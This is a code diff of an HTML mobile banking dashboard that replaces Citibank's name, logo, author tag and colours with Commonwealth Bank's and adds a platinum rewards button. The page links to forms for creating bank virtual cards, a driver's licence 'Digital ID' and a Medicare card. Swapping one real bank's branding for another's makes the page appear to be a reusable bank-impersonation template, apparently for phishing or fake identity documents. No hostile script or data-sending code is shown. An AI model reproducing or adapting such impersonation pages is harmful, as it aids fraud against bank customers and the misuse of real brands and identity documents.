@@ -3,21 +3,21 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="description" content="Citi Banking - Your Digital Banking Experience">
+  <meta name="description" content="CommBank - Your Digital Banking Experience">
   <meta name="keywords" content="digital banking, banking app, financial services, digital cards">
-  <meta name="author" content="Citibank">
+  <meta name="author" content="Commonwealth Bank">
   <meta name="robots" content="index, follow">
   <meta name="apple-mobile-web-app-capable" content="yes">
   <meta name="mobile-web-app-capable" content="yes">
-  <title>Citi Banking</title>
+  <title>CommBank</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js" defer></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     :root {
-      --primary-blue: #056DAE;
-      --secondary-blue: #0085C3;
-      --accent-red: #DC143C;
+      --primary-yellow: #FFCD00;
+      --secondary-black: #000000;
+      --accent-gray: #666666;
       --background: #f8fafc;
       --card-white: #ffffff;
       --text-primary: #1e293b;
@@ -36,11 +36,15 @@
     }
 
     .banking-gradient {
-      background: linear-gradient(135deg, var(--primary-blue) 0%, var(--secondary-blue) 100%);
+      background: linear-gradient(135deg, var(--secondary-black) 0%, var(--accent-gray) 100%);
     }
 
-    .citi-gradient {
-      background: linear-gradient(135deg, #056DAE 0%, #0085C3 50%, #DC143C 100%);
+    .commbank-gradient {
+      background: linear-gradient(135deg, #000000 0%, #FFCD00 100%);
+    }
+
+    .commbank-platinum {
+      background: linear-gradient(135deg, #2C3E50 0%, #FFCD00 50%, #E8E8E8 100%);
     }
 
     .card-shadow {
@@ -48,7 +52,7 @@
     }
 
     .balance-card {
-      background: linear-gradient(135deg, #056DAE 0%, #DC143C 100%);
+      background: linear-gradient(135deg, #000000 0%, #FFCD00 100%);
     }
 
     .action-btn {
@@ -76,15 +80,15 @@
   <div class="min-h-screen bg-gray-50 flex flex-col max-w-sm mx-auto relative overflow-hidden">
     
     <!-- Header -->
-    <header class="citi-gradient text-white p-6 pb-8 relative">
+    <header class="commbank-gradient text-white p-6 pb-8 relative">
       <div class="flex items-center justify-between mb-6">
         <div class="flex items-center space-x-3">
           <div class="w-10 h-10 bg-white/20 rounded-lg flex items-center justify-center">
-            <img src="App/assets/citibank.png" alt="Citibank" class="w-8 h-8 object-contain">
+            <img src="App/assets/commbank.png" alt="Commonwealth Bank" class="w-8 h-8 object-contain">
           </div>
           <div>
-            <h1 class="text-xl font-semibold">Citi Banking</h1>
-            <p class="text-blue-100 text-sm">Welcome back, John</p>
+            <h1 class="text-xl font-semibold">CommBank</h1>
+            <p class="text-yellow-100 text-sm">Welcome back, John</p>
           </div>
         </div>
         <div class="flex items-center space-x-4">
@@ -131,6 +135,26 @@
     <!-- Main Content -->
     <main class="flex-1 px-6 py-6 space-y-6">
       
+      <!-- Platinum Rewards Button -->
+      <section>
+        <div class="mb-6">
+          <button class="w-full commbank-platinum text-white rounded-2xl p-6 card-shadow action-btn block text-left">
+            <div class="flex items-center space-x-4">
+              <div class="w-12 h-12 bg-white/20 rounded-xl flex items-center justify-center">
+                <i class="fas fa-gem text-white text-lg"></i>
+              </div>
+              <div class="flex-1">
+                <h4 class="font-semibold text-white mb-1">View Platinum Credit Rewards</h4>
+                <p class="text-white/80 text-sm">Explore your exclusive rewards and benefits</p>
+              </div>
+              <div>
+                <i class="fas fa-arrow-right text-white text-lg"></i>
+              </div>
+            </div>
+          </button>
+        </div>
+      </section>
+
       <!-- Quick Actions -->
       <section>
         <h3 class="text-lg font-semibold mb-4 text-gray-900">Digital Services</h3>
@@ -138,16 +162,16 @@
           
           <!-- Digital Credit Card -->
           <a href="forms/credit_card/index.html" class="bg-white rounded-2xl p-6 card-shadow action-btn block">
-            <div class="w-12 h-12 citi-gradient rounded-xl flex items-center justify-center mb-4">
+            <div class="w-12 h-12 commbank-gradient rounded-xl flex items-center justify-center mb-4">
               <i class="fas fa-credit-card text-white text-lg"></i>
             </div>
-            <h4 class="font-semibold text-gray-900 mb-2">Citi Card</h4>
-            <p class="text-gray-600 text-sm">Create Citi virtual cards</p>
+            <h4 class="font-semibold text-gray-900 mb-2">CommBank Card</h4>
+            <p class="text-gray-600 text-sm">Create CommBank virtual cards</p>
           </a>
           
           <!-- Driver's License -->
           <a href="forms/licence/index.html" class="bg-white rounded-2xl p-6 card-shadow action-btn block">
-            <div class="w-12 h-12 bg-blue-500 rounded-xl flex items-center justify-center mb-4">
+            <div class="w-12 h-12 bg-gray-600 rounded-xl flex items-center justify-center mb-4">
               <i class="fas fa-id-card text-white text-lg"></i>
             </div>
             <h4 class="font-semibold text-gray-900 mb-2">Digital ID</h4>
@@ -156,7 +180,7 @@
           
           <!-- Medicare Card -->
           <a href="forms/medicare/index.html" class="bg-white rounded-2xl p-6 card-shadow action-btn block">
-            <div class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center mb-4">
+            <div class="w-12 h-12 bg-green-600 rounded-xl flex items-center justify-center mb-4">
               <i class="fas fa-notes-medical text-white text-lg"></i>
             </div>
             <h4 class="font-semibold text-gray-900 mb-2">Health Services</h4>
@@ -165,11 +189,11 @@
           
           <!-- Card Settings -->
           <a href="select.html" class="bg-white rounded-2xl p-6 card-shadow action-btn block">
-            <div class="w-12 h-12 citi-gradient rounded-xl flex items-center justify-center mb-4">
+            <div class="w-12 h-12 commbank-gradient rounded-xl flex items-center justify-center mb-4">
               <i class="fas fa-cog text-white text-lg"></i>
             </div>
             <h4 class="font-semibold text-gray-900 mb-2">Account Settings</h4>
-            <p class="text-gray-600 text-sm">Citi services</p>
+            <p class="text-gray-600 text-sm">CommBank services</p>
           </a>
         </div>
       </section>
@@ -188,8 +212,8 @@
                 <i class="fas fa-arrow-down text-green-600"></i>
               </div>
               <div class="flex-1">
-                <p class="font-semibold text-gray-900">Citi Card Created</p>
-                <p class="text-gray-600 text-sm">Citi Rewards+ Card</p>
+                <p class="font-semibold text-gray-900">CommBank Card Created</p>
+                <p class="text-gray-600 text-sm">Awards Credit Card</p>
               </div>
               <div class="text-right">
                 <p class="font-semibold text-gray-900">Today</p>
@@ -238,8 +262,8 @@
     <nav class="bg-white border-t border-gray-200 px-6 py-4">
       <div class="flex justify-around">
         <button class="flex flex-col items-center space-y-1">
-          <i class="fas fa-home text-[#056DAE] text-lg"></i>
-          <span class="text-xs text-[#056DAE] font-medium">Home</span>
+          <i class="fas fa-home text-[#FFCD00] text-lg"></i>
+          <span class="text-xs text-[#FFCD00] font-medium">Home</span>
         </button>
         <button class="flex flex-col items-center space-y-1" onclick="window.location.href='select.html'">
           <i class="fas fa-credit-card text-gray-400 text-lg"></i>
